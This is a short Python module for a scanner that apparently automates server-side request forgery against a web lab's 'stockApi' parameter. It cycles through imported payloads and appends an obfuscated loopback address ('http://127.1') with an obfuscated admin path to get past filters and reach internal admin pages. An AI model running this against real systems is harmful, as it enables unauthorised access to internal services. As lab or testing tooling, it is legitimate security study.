import requests
from .payloads import get_all_payloads
from .utils import build_obfuscated_admin_path

class SSRFScanner:

    def __init__(self, base_url, cookies=None, timeout=5):
        self.base_url = base_url
        self.cookies = cookies or {}

    def try_payload(self, payload):
        try:
            r = requests.get(
                self.base_url,
                params={"stockApi": payload},
                cookies=self.cookies,
                timeout=5
            )
            return {
                "payload": payload,
                "status": r.status_code,
                "length": len(r.text),
                "success": r.status_code < 500
            }
        except Exception as e:
            return {"payload": payload, "error": str(e)}

    def run(self):
        results = []
        for p in get_all_payloads():
            results.append(self.try_payload(p))

        obf_admin = "http://127.1" + build_obfuscated_admin_path()
        results.append(self.try_payload(obf_admin))

        return results
